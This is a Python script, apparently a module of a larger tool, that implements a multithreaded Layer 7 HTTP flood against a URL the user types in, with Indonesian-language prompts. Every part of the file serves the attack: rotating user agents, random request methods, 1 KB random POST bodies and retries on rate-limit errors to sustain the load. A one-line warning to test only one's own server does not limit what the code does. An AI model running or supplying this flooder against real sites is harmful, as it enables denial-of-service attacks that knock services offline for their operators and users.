import requests
import threading
import random
import time
from utils.color import red, green, yellow, cyan
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def create_session():
    session = requests.Session()
    retries = Retry(
        total=10,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

session = create_session()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "curl/7.88.0",
    "python-requests/2.31.0",
    "ddos-test/1.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS"]

def flood(target_url):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        method = random.choice(HTTP_METHODS)
        
        if method == "POST":
            data = {"payload": random._urandom(1024)}  # 1 KB random bytes
            response = session.post(target_url, headers=headers, data=data, timeout=15)
        elif method == "GET":
            response = session.get(target_url, headers=headers, timeout=15)
        elif method == "HEAD":
            response = session.head(target_url, headers=headers, timeout=15)
        elif method == "OPTIONS":
            response = session.options(target_url, headers=headers, timeout=15)
        else:
            response = session.get(target_url, headers=headers, timeout=15)

        print(green(f"🔥 [{method}] Status: {response.status_code} | URL: {target_url}"))
    except requests.exceptions.RequestException as e:
        print(red(f"💥 Error: {str(e)}"))

def run():
    print(red("\n🚨 WARNING! Layer 7 HTTP Flood tanpa endpoint random"))
    print(yellow("💣 Gunakan hanya untuk testing VPS/Server lo sendiri, bijak ya!\n"))

    target = input(cyan("🌐 Masukkan URL target (contoh: http://localhost): "))
    threads = int(input("🔁 Jumlah thread (disarankan 50+): "))
    duration = int(input("⏱️ Durasi (detik): "))

    print(green(f"\n🚀 Menyerang {target} dengan {threads} thread selama {duration} detik...\n"))

    end_time = time.time() + duration

    def attack():
        while time.time() < end_time:
            flood(target)

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(green("\n✅ Serangan selesai. Semoga bermanfaat dan dipakai bijak. 😎"))
